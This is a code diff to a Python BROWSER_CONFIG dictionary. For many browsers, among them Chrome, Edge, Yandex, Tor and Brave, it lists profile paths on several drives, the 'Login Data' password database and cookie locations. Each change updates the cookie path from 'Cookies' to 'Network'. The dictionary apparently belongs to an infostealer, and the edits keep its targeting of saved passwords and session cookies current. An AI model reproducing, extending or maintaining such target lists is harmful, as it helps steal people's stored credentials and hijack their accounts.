@@ -435,7 +435,7 @@ BROWSER_CONFIG = {
             r"E:\Google\Chrome\User Data\Default"
         ],
         'password_files': ['Login Data'],
-        'cookie_path': r"AppData\Local\Google\Chrome\User Data\Default\Cookies"
+        'cookie_path': r"AppData\Local\Google\Chrome\User Data\Default\Network"
     },
     'edge': {
         'paths': [
@@ -446,7 +446,7 @@ BROWSER_CONFIG = {
             r"E:\Microsoft\Edge\User Data\Default"
         ],
         'password_files': ['Login Data'],
-        'cookie_path': r"AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
+        'cookie_path': r"AppData\Local\Microsoft\Edge\User Data\Default\Network"
     },
     'opera': {
         'paths': [
@@ -476,7 +476,7 @@ BROWSER_CONFIG = {
             r"E:\Yandex\YandexBrowser\User Data\Default"
         ],
         'password_files': ['Login Data'],
-        'cookie_path': r"AppData\Local\Yandex\YandexBrowser\User Data\Default\Cookies"
+        'cookie_path': r"AppData\Local\Yandex\YandexBrowser\User Data\Default\Network"
     },
     'tor': {
         'paths': [
@@ -497,7 +497,7 @@ BROWSER_CONFIG = {
             r"E:\BraveSoftware\Brave-Browser\User Data\Default"
         ],
         'password_files': ['Login Data'],
-        'cookie_path': r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies"
+        'cookie_path': r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network"
     },
     'vivaldi': {
         'paths': [
@@ -517,7 +517,7 @@ BROWSER_CONFIG = {
             r"E:\Slimjet\User Data\Default"
         ],
         'password_files': ['Login Data'],
-        'cookie_path': r"AppData\Local\Slimjet\User Data\Default\Cookies"
+        'cookie_path': r"AppData\Local\Slimjet\User Data\Default\Network"
     },
     'falkon': {
         'paths': [
@@ -547,7 +547,7 @@ BROWSER_CONFIG = {
             r"E:\Maxthon3\User Data"
         ],
         'password_files': ['Login Data'],
-        'cookie_path': r"AppData\Local\Maxthon3\User Data\Cookies"
+        'cookie_path': r"AppData\Local\Maxthon3\User Data\Network"
     },
     'palemoon': {
         'paths': [
@@ -577,7 +577,7 @@ BROWSER_CONFIG = {
             r"E:\Iridium\User Data\Default"
         ],
         'password_files': ['Login Data'],
-        'cookie_path': r"AppData\Local\Iridium\User Data\Default\Cookies"
+        'cookie_path': r"AppData\Local\Iridium\User Data\Default\Network"
     },
     'centbrowser': {
         'paths': [
@@ -587,7 +587,7 @@ BROWSER_CONFIG = {
             r"E:\CentBrowser\User Data\Default"
         ],
         'password_files': ['Login Data'],
-        'cookie_path': r"AppData\Local\CentBrowser\User Data\Default\Cookies"
+        'cookie_path': r"AppData\Local\CentBrowser\User Data\Default\Network"
     }
 }
 
